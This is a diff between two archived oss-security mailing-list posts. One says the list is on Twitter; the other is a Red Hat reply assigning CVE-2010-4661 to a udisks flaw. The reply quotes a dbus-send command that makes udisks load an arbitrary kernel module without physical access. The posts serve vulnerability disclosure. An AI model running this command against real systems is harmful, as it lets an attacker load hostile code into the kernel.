@@ -1,16 +1,32 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/23/3
-Message-ID: <4D898855.3090505@redhat.com>
-Date: Wed, 23 Mar 2011 13:42:45 +0800
-From: Eugene Teo <eugene@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/02/23/19
+Message-ID: <20110223174135.GN30355@redhat.com>
+Date: Wed, 23 Feb 2011 10:41:35 -0700
+From: Vincent Danen <vdanen@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: oss-security is on twitter
+Subject: Re: Physical access vulnerabilities and auto-mounting
 Content-Type: text/plain; charset=utf-8
 
-Just in case you do not know, oss-security is on twitter.
+* [2011-02-23 08:33:48 +0100] Sebastian Krahmer wrote:
 
-Follow @oss_security :)
+>Unfortunally I think nobody would care. As nobody cared
+>that you actually do not need physical access. Via udisks DBUS
+>service you can load any LKM via
+>
+>dbus-send --system --print-reply --dest=org.freedesktop.UDisks          \
+>                   /org/freedesktop/UDisks/devices/sr0                  \
+>                   org.freedesktop.UDisks.Device.FilesystemMount        \
+>                   string:'LKM' array:string:''
+>
+>I reported that several months ago to upstream but it was frozen to more
+>or less a non-issue. Indeed nobody agreed that this is an issue to fix.
 
-Eugene
+Please use CVE-2010-4661 for this udisks flaw.
+
+Some additional references:
+
+https://bugs.freedesktop.org/show_bug.cgi?id=32232
+https://bugzilla.redhat.com/show_bug.cgi?id=664082
+
 -- 
-main(i) { putchar(182623909 >> (i-1) * 5&31|!!(i<7)<<6) && main(++i); }
+Vincent Danen / Red Hat Security Response Team 
